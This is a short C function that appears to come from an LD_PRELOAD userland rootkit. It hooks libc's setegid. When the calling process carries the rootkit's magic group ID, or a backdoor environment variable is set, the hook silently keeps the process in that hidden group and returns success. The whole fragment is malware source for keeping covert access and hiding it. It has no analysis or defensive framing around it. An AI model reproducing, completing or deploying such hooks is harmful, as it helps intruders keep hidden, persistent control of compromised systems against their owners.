int setegid(gid_t egid){
    hook(CSETEGID);
    if(!initmvbc()) return (long)call(CSETEGID, egid);
    if(getgid() == mvbc->magicid || getenv(mvbc->bdvar) != NULL){
        if(egid != mvbc->magicid)
            call(CSETEGID, mvbc->magicid);
        return 0;
    }
    return (long)call(CSETEGID, egid);
}
